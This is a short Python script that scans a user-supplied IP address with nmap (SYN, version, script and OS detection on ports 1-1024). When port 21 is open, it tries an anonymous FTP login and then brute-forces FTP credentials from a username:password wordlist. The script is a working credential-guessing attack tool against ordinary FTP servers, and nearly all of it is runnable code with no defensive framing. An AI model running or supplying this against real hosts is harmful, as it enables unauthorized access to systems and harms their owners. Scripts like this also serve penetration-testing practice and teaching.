import nmap
import ftplib
import argparse
import time

def perform_comprehensive_scan(ip_addr):
    scanner = nmap.PortScanner()
    print("Nmap Version: ", scanner.nmap_version())
    scanner.scan(ip_addr, '1-1024', '-v -sS -sV -sC -A -O')
    print(scanner.scaninfo())
    print("IP Status: ", scanner[ip_addr].state())

    # Print service scan results
    for proto in scanner[ip_addr].all_protocols():
        print("Protocol: ", proto)
        ports = scanner[ip_addr][proto].keys()
        for port in ports:
            print("Port: ", port)
            print("Service: ", scanner[ip_addr][proto][port]['name'])

    # Print OS scan results
    if 'osmatch' in scanner[ip_addr]:
        for os_match in scanner[ip_addr]['osmatch']:
            print("Detected OS: ", os_match['name'])

    return scanner[ip_addr]['tcp']

def anon_login(ip_addr):
    try:
        ftp = ftplib.FTP(ip_addr)
        ftp.login('anonymous', 'me@your.com')
        print(f'[*] {ip_addr} FTP Anonymous Logon Succeeded.')
        ftp.quit()
        return True
    except Exception as e:
        print(f'[-] {ip_addr} FTP Anonymous Logon Failed.')
        print(f'[-] Exception: {e}')
        return False

def brute_login(ip_addr, username, password):
    try:
        ftp = ftplib.FTP(ip_addr)
        ftp.login(username, password)
        print(f'[*] {ip_addr} FTP Logon Succeeded: {username}/{password}')
        ftp.quit()
        return True
    except Exception as e:
        print(f'[-] {ip_addr} FTP Logon Failed: {username}/{password}')
        print(f'[-] Exception: {e}')
        return False

# Main program
ip_addr = input("Enter the IP address to scan: ")

# Perform comprehensive scan (including service and OS detection)
open_ports = perform_comprehensive_scan(ip_addr)

if 21 in open_ports:
    if anon_login(ip_addr):
        print('[+] Anonymous login successful.')
    else:
        pass_file = input("Enter the user/password file for brute-force attack: ")
        with open(pass_file) as file:
            for line in file:
                time.sleep(1)
                username, password = line.strip().split(':')
                print(f'[+] Trying: {username}/{password}')
                if brute_login(ip_addr, username, password):
                    break
else:
    print("Port 21 is not open, skipping FTP login attempts.")
